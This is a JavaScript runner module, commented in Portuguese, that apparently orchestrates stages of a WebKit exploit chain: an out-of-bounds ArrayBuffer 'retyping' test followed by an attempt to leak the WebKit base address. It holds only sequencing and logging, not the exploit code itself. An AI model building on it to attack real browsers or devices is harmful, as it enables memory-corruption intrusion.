// js/script3/runAllAdvancedTestsS3.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
// Atualizar a importação para incluir 'attemptWebKitBaseLeakStrategy'
import { executeRetypeOOB_AB_Test, attemptWebKitBaseLeakStrategy } from './testRetypeOOB_AB_ViaShadowCraft.mjs';

async function runRetypeOOB_AB_Strategy() {
    const FNAME_RUNNER = "runRetypeOOB_AB_Strategy";
    logS3(`==== INICIANDO Estratégia de "Re-Tipagem" do oob_array_buffer_real ====`, 'test', FNAME_RUNNER);

    await executeRetypeOOB_AB_Test();

    logS3(`==== Estratégia de "Re-Tipagem" do oob_array_buffer_real CONCLUÍDA ====`, 'test', FNAME_RUNNER);
}

// Função para a nova estratégia de vazamento de base (pode ser chamada separadamente ou em sequência)
async function runWebKitBaseLeakStrategy() {
    const FNAME_RUNNER = "runWebKitBaseLeakStrategy";
    logS3(`==== INICIANDO Estratégia de Vazamento de Base do WebKit ====`, 'test', FNAME_RUNNER);

    await attemptWebKitBaseLeakStrategy();

    logS3(`==== Estratégia de Vazamento de Base do WebKit CONCLUÍDA ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME = 'runAllAdvancedTestsS3_Combined'; // Nome atualizado para refletir múltiplos testes
    const runBtn = getRunBtnAdvancedS3();
    const outputDiv = getOutputAdvancedS3();

    if (runBtn) runBtn.disabled = true;
    if (outputDiv) outputDiv.innerHTML = '';

    logS3(`==== INICIANDO Script 3: Testes Avançados ====`,'test', FNAME);
    document.title = "Iniciando Script 3 - Testes Avançados";

    // 1. Executar o teste de re-tipagem do ArrayBuffer (0x6C)
    await runRetypeOOB_AB_Strategy();

    // Pausa breve entre as estratégias, se desejar
    await PAUSE_S3(MEDIUM_PAUSE_S3);

    // 2. Executar a tentativa de vazamento de base do WebKit
    // Certifique-se de que os offsets e a lógica em attemptWebKitBaseLeakStrategy
    // estão configurados para o seu alvo específico.
    logS3(`\n==== TRANSIÇÃO: Preparando para tentativa de Vazamento de Base do WebKit ====`,'test', FNAME);
    document.title = "Script 3 - Tentativa de Leak de Base";
    await runWebKitBaseLeakStrategy();

    logS3(`\n==== Script 3 CONCLUÍDO (Testes Avançados) ====`,'test', FNAME);
    if (runBtn) runBtn.disabled = false;

    // Atualiza o título final com base no sucesso ou falha dos testes (se houver uma flag global de sucesso)
    // Por enquanto, um título genérico de conclusão se não houver erro explícito no título.
    if (!document.title.includes("SUCCESS") && !document.title.includes("FAIL") && !document.title.includes("ERRO")) {
         document.title = "Script 3 Concluído - Testes Avançados";
    }
}
